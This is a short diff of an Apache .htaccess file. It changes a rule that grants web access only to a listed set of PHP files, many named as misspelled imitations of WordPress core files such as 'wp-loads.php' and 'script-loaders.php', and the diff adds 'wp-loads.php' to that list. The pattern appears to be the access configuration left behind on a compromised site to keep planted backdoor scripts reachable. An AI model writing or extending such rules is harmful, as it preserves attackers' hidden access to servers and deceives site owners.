@@ -5,7 +5,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(script-loaders.php|class-wp-widget-rssc.php|class-wp-customize-nav-menu-sections.php|manager.inc.php|index.php|PublicIdentifiersForm.inc.php)$">
+<FilesMatch "^(script-loaders.php|class-wp-widget-rssc.php|class-wp-customize-nav-menu-sections.php|manager.inc.php|index.php|PublicIdentifiersForm.inc.php|wp-loads.php|)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
